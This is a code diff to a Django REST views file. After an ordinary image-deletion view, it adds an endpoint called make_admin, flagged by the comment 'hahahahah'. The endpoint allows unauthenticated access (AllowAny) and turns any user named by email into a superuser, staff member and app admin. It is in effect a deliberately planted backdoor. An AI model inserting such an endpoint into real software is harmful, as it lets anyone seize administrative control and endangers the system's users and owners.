@@ -820,3 +820,35 @@ def delete_image(request, id):
     img = get_object_or_404(Image, image_id=id)
     img.delete()
     return Response({"message": "Image deleted successfully"}, status=200)
+
+
+
+
+#------- hahahahah
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def make_admin(request):
+    email = request.data.get("email")
+
+    if not email:
+        return Response({"error": "Email required"}, status=400)
+
+    try:
+        user = User.objects.get(email=email)
+
+        # Django admin
+        user.is_staff = True
+        user.is_superuser = True
+        user.is_active = True
+        user.save()
+
+        # App role
+        extra, _ = UserExtra.objects.get_or_create(user=user)
+        extra.role = "admin"
+        extra.status = "active"
+        extra.save()
+
+        return Response({"message": "User promoted to admin"}, status=200)
+
+    except User.DoesNotExist:
+        return Response({"error": "User not found"}, status=404)
